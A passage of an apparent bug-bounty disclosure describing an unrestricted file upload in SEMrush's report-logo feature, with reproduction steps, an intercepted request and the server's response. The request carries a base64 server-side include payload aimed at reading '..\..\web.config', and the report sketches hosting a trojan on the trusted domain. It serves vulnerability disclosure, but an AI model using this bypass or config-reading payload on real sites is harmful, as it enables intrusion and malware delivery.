Gecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 184\nOrigin: https://www.semrush.com\nConnection: close\nReferer: https://www.semrush.com/info/findme\nCookie: ██████████\n\nresultFiles%5B0%5D%5Bfiledata%5D=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPCEtLSNpbmNsdWRlIGZpbGU9Ii4uXC4uXHdlYi5jb25maWciIC0tPg%3D%3D\u0026resultFiles%5B0%5D%5Bname%5D=include.exe\u0026fileType=logo\n```\n`resultFiles%5B0%5D%5Bfiledata%5D=` is the content of the file, `resultFiles%5B0%5D%5Bname%5D=` is the name of the file. There was no check of the content of the file or the name.\n\n####Response:\n```\nHTTP/1.1 200 OK\nDate: Sat, 30 Nov 2019 23:21:16 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCF-Ray: 53e08e819bafe8ff-MXP\nCF-Cache-Status: DYNAMIC\nCache-Control: max-age=0, no-cache, no-store, must-revalidate\nContent-Language: en\nETag: W/\"7a-/Lqkux4Seyfu7ftu88H+ZZ+qFuw\"\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nVary: X-HTTP-Method-Override, Cookie, Accept-Encoding\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\n██████\n█████████\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Powered-By: Express\nX-Service: tools.my_reports\nX-Service-Response-Time: 0.08602\nX-XSS-Protection: 1; mode=block\nServer: cloudflare\nContent-Length: 122\n\n{\"status\":\"success\",\"result\":{\"621218\":\"/my_reports/images/user-images/5281379/file8fee41302f4211ec853bd6e8e41e2dc6.exe\"}}\n```","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eIn many sections of the platform is presents the possibility to print a PDF of the SEO results you have obtained, this was discovered first at \u0026quot;Keyboard analytics\u0026quot; \u0026gt; \u0026quot;Overview\u0026quot;. The report generator gives you the possibility to brand your report with your logo.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve intercepted the request of the logo upload thanks to Burp Suite. The content of the file was encoded in base64 and I\u0026#39;ve successfully managed to modify the extension of the file by simply renaming it without any kind of restriction.\u003c/p\u003e\n\n\u003cp\u003eSo, the \u003cstrong\u003e\u003cem\u003esteps to reproduce\u003c/em\u003e\u003c/strong\u003e this vulnerability were:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eClick on the PDF button to generate your report;\u003c/li\u003e\n\u003cli\u003eClick on \u0026quot;Brand this report\u0026quot; and upload your logo;\u003c/li\u003e\n\u003cli\u003eIntercept the request, modify the content if you have to and modify the extension.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe same file will be also hosted on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.semrush.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.semrush.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, es.semrush.com, de.semrush.com, fr.semrush.com, it.semrush.com, pt.semrush.com, ru.semrush.com, zh.semrush.com, ja.semrush.com at the same time by a single upload.\u003c/p\u003e\n\n\u003cp\u003e(un)fortunately, when you try to reach the file you only could download it. For this reason, the impact of the vulnerability was limited.\u003c/p\u003e\n\n\u003cp\u003eAn example scenario to clarify the impact was this: if I have bad intentions, I can upload an apk or exe with a trojan and storing it on your website. I can then send the link to the file to every SEMrush user saying that it\u0026#39;s a new special update and since the file is on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.semrush.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.semrush.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the file is trustworthy.\u003c/p\u003e\n\n\u003ch4 id=\"request\"\u003eRequest:\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /my_reports/api/v1/upload/image HTTP/1.1\nHost: www.semrush.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 184\nOrigin: https://www.semrush.com\nConnection: close\nReferer: https://www.semrush.com/info/findme\nCookie: ██████████\n\nresultFiles%5B0%5D%5Bfiledata%5D=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPCEtLSNpbmNsdWRlIGZpbGU9Ii4uXC4uXHdlYi5jb25maWciIC0tPg%3D%3D\u0026amp;resultFiles%5B0%5D%5Bname%5D=include.exe\u0026amp;fileType=logo\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eresultFiles%5B0%5D%5Bfiledata%5D=\u003c/code\u003e is the content of the file, \u003ccode\u003eresultFiles%5B0%5D%5Bname%5D=\u003c/code\u003e is the name of the file. There was no check of the content of the file or the name.\u003c/p\u003e\n\n\u003ch4 id=\"response\"\u003eResponse:\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nDate: Sat, 30 Nov 2019 23:21:16 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nCF-Ray: 53e08e819bafe8ff-MXP\nCF-Cache-Status: DYNAMIC\nCache-Control: max-age=0, no-cache, no-store, must-revalidate\nContent-Language: en\nETag: W/\u0026quot;7a-/Lqkux4Seyfu7ftu88H+ZZ+qFuw\u0026quot;\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nVary: X-HTTP-Method-Override, Cookie, Accept-Encoding\nExpect-CT: max-age=604800, report-uri=\u0026quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\u0026quot;\n██████\n█████████\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Powered-By: Express\nX-Service: tools.my_reports\nX-Service-Response-Time: 0.08602\nX-XSS-Protection: 1; mode=block\nServer: cloudflare\nContent-Length: 122\n\n{\u0026quot;status\u0026quot;:\u0026quot;success\u0026quot;,\u0026quot;result\u0026quot;:{\u0026quot;621218\u0026quot;:\u0026quot;/my_reports/images/user-images/5281379/file8fee41302f4211ec853bd6e8e41e2dc6.exe\u0026quot;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e"}]}